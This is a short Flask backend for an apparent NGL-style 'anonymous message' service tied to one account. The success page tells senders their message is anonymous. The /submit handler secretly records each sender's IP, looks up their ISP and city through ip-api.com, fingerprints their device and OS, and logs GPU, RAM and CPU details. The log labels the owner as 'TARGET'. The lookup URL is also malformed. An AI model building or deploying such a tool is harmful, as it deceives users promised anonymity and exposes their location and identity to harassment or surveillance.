from flask import Flask, request, render_template_string
from flask_cors import CORS
from user_agents import parse
import datetime
import requests

app = Flask(__name__)
CORS(app)

# Use triple-quoted strings for cleaner multi-line HTML
SUCCESS_PAGE = """
<div style="background: white; padding: 40px; border-radius: 35px; text-align: center; font-family: sans-serif;">
    <h1 style="color: #FE2F78;">✅ Sent!</h1>
    <p style="color: #666;">Your anonymous message has been delivered to @vaibhav_w16</p>
</div>
"""

@app.route('/')
def home():
    return "NGL Backend for @vaibhav_w16 is ONLINE.", 200

@app.route('/submit', methods=['POST'])
def submit():
    try:
        data = request.form
        msg = data.get('message', 'No Message')
        
        # IP and Network Lookup
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        network_info = "Lookup Failed"
        try:
            res = requests.get(f"http://ip-api.com{ip}?fields=isp,city", timeout=3)
            d = res.json()
            network_info = f"{d.get('isp')} | {d.get('city')}"
        except:
            network_info = f"IP: {ip}"

        # Enhanced Device Parsing
        ua_string = request.headers.get('User-Agent', '')
        user_agent = parse(ua_string)
        device_brand = user_agent.device.brand if user_agent.device.brand else ""
        device_model = user_agent.device.model if user_agent.device.model else "PC/Mac"
        os_info = f"{user_agent.os.family} {user_agent.os.version_string}"
        
        # Log Report
        log_report = (
            f"\n{'#'*60}\n"
            f"🎯 TARGET: @vaibhav_w16 | {datetime.datetime.now()}\n"
            f"💬 MSG: {msg}\n"
            f"📱 DEVICE: {device_brand} {device_model} ({os_info})\n"
            f"🌐 NET: {network_info}\n"
            f"⚙️ HW: GPU:{data.get('gpu')} | RAM:{data.get('ram')}GB | CPU:{data.get('cores')}\n"
            f"{'#'*60}\n"
        )
        print(log_report)
        return SUCCESS_PAGE, 200

    except Exception as e:
        print(f"ERROR: {e}")
        return "Internal Error", 500

if __name__ == "__main__":
    app.run()
